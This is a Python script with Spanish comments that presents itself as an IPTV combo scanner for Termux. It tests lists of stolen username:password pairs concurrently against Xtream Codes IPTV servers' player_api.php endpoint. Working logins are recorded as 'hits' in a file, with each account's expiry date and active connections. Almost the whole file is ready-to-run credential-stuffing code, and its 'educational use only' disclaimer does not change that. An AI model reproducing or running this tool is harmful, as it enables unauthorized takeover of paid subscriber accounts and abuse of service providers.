#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import aiohttp
from colorama import init, Fore, Style
import sys
import os
import time
from datetime import datetime

# Inicializar colorama para coleres en la terminal
init(autoreset=True)

# Banner de inicio
def show_banner():
    print(Fore.CYAN + Style.BRIGHT + """
    ╔═══════════════════════════════════════════╗
    ║     IPTV COMBO SCANNER for Termux         ║
    ║           Educational Use Only            ║
    ╚═══════════════════════════════════════════╝
    """ + Style.RESET_ALL)
    print(Fore.YELLOW + "[!] Uso exclusivo para fines educativos. No me hago responsable del mal uso." + Style.RESET_ALL)

# Función para cargar combos desde un archivo
def load_combos(filepath="combos.txt"):
    combos = []
    try:
        with open(filepath, 'r') as f:
            for line in f:
                # Buscar el separador ':' en la línea
                if ':' in line:
                    user, pwd = line.strip().split(':', 1)
                    combos.append((user, pwd))
    except FileNotFoundError:
        print(Fore.RED + f"[!] Error: No se encontró el archivo '{filepath}'." + Style.RESET_ALL)
        sys.exit(1)
    return combos

# Función para guardar un hit válido
def save_hit(server_url, combo, user_info, filename="hits.txt"):
    with open(filename, 'a') as f:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{timestamp}] SERVER: {server_url} | COMBO: {combo[0]}:{combo[1]}\n")
        if user_info:
            f.write(f"    INFO: {user_info}\n")
        f.write("-" * 50 + "\n")

# Función asíncrona para probar un combo en un servidor Xtream Codes
async def test_combo(session, server_url, combo, semaphore, results):
    async with semaphore:
        user, pwd = combo
        # Construir la URL de la API de Xtream Codes
        test_url = f"{server_url}/player_api.php?username={user}&password={pwd}"
        
        try:
            # Intentar obtener la respuesta de la API
            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                if response.status == 200:
                    data = await response.json(content_type=None)
                    # Verificar si la respuesta es un diccionario válido (no una lista vacía)
                    if isinstance(data, dict) and data.get('user_info'):
                        user_info = data.get('user_info')
                        # Extraer información relevante del usuario
                        info_text = f"Expira: {user_info.get('exp_date', 'N/A')}, "
                        info_text += f"Activas: {user_info.get('active_cons', 'N/A')}"
                        results.append(('hit', server_url, combo, info_text))
                        return
        except asyncio.TimeoutError:
            pass  # Timeout, se ignora
        except Exception:
            pass  # Otros errores, se ignoran
        
        # Si no hubo éxito, se marca como 'bad'
        results.append(('bad', server_url, combo, None))

# Función principal para escanear
async def scan_servers(servers, combos, max_concurrent=20):
    results = []
    semaphore = asyncio.Semaphore(max_concurrent)
    
    # Usar una sesión de aiohttp para todas las conexiones
    async with aiohttp.ClientSession() as session:
        tasks = []
        total_tasks = len(servers) * len(combos)
        completed = 0
        
        for server in servers:
            for combo in combos:
                task = test_combo(session, server, combo, semaphore, results)
                tasks.append(task)
        
        # Ejecutar todas las tareas de forma concurrente
        print(Fore.GREEN + f"[*] Iniciando escaneo de {len(servers)} servidor(es) con {len(combos)} combo(s)... (Total: {total_tasks} pruebas)" + Style.RESET_ALL)
        
        # Usar as_completed para mostrar el progreso
        for coro in asyncio.as_completed(tasks):
            await coro
            completed += 1
            # Mostrar progreso cada 50 pruebas completadas
            if completed % 50 == 0 or completed == total_tasks:
                print(Fore.CYAN + f"[*] Progreso: {completed}/{total_tasks} pruebas completadas." + Style.RESET_ALL)
    
    return results

# Función para obtener la lista de servidores desde un archivo
def load_servers(filepath="servers.txt"):
    servers = []
    try:
        with open(filepath, 'r') as f:
            for line in f:
                server = line.strip()
                if server:  # Ignorar líneas vacías
                    servers.append(server)
    except FileNotFoundError:
        print(Fore.RED + f"[!] Error: No se encontró el archivo '{filepath}'." + Style.RESET_ALL)
        sys.exit(1)
    return servers

# Función para mostrar el resumen final
def show_results(results, start_time):
    hits = [r for r in results if r[0] == 'hit']
    bads = [r for r in results if r[0] == 'bad']
    elapsed_time = time.time() - start_time
    
    print("\n" + "="*60)
    print(Fore.GREEN + Style.BRIGHT + "RESUMEN DEL ESCANEO")
    print("="*60)
    print(Fore.YELLOW + f"Tiempo total: {elapsed_time:.2f} segundos")
    print(Fore.GREEN + f"Hits (Válidos): {len(hits)}")
    print(Fore.RED + f"Bads (Inválidos): {len(bads)}")
    
    if hits:
        print("\n" + Fore.GREEN + Style.BRIGHT + "=== HITS ENCONTRADOS ===" + Style.RESET_ALL)
        for hit in hits:
            _, server, combo, info = hit
            print(Fore.GREEN + f"[+] Servidor: {server}")
            print(f"    Combo: {combo[0]}:{combo[1]}")
            if info:
                print(f"    Info: {info}")
            print("-" * 40)
            # Guardar automáticamente el hit en el archivo hits.txt
            save_hit(server, combo, info)
        print(Fore.GREEN + f"\n[✓] Los hits se han guardado en 'hits.txt'" + Style.RESET_ALL)
    else:
        print(Fore.RED + "\n[✗] No se encontraron hits." + Style.RESET_ALL)

# Bloque principal de ejecución
if __name__ == "__main__":
    show_banner()
    
    # Verificar argumentos de línea de comandos
    if len(sys.argv) > 1 and sys.argv[1] == "--help":
        print(Fore.CYAN + "Uso: python iptv_scanner.py [servidores.txt] [combos.txt]")
        print("  servidores.txt: Archivo con lista de servidores IPTV (uno por línea)")
        print("  combos.txt: Archivo con combos en formato usuario:contraseña (uno por línea)")
        print("\nEjemplo: python iptv_scanner.py servidores.txt combos.txt")
        sys.exit(0)
    
    # Definir nombres de archivo por defecto o usar argumentos
    server_file = sys.argv[1] if len(sys.argv) > 1 else "servers.txt"
    combo_file = sys.argv[2] if len(sys.argv) > 2 else "combos.txt"
    
    # Cargar servidores y combos
    print(Fore.CYAN + f"[*] Cargando servidores desde '{server_file}'..." + Style.RESET_ALL)
    servers = load_servers(server_file)
    print(Fore.GREEN + f"[✓] {len(servers)} servidor(es) cargados." + Style.RESET_ALL)
    
    print(Fore.CYAN + f"[*] Cargando combos desde '{combo_file}'..." + Style.RESET_ALL)
    combos = load_combos(combo_file)
    print(Fore.GREEN + f"[✓] {len(combos)} combo(s) cargados." + Style.RESET_ALL)
    
    if not servers or not combos:
        print(Fore.RED + "[!] Error: No hay servidores o combos para escanear." + Style.RESET_ALL)
        sys.exit(1)
    
    # Iniciar el escaneo y medir el tiempo
    start_time = time.time()
    results = asyncio.run(scan_servers(servers, combos))
    
    # Mostrar los resultados
    show_results(results, start_time)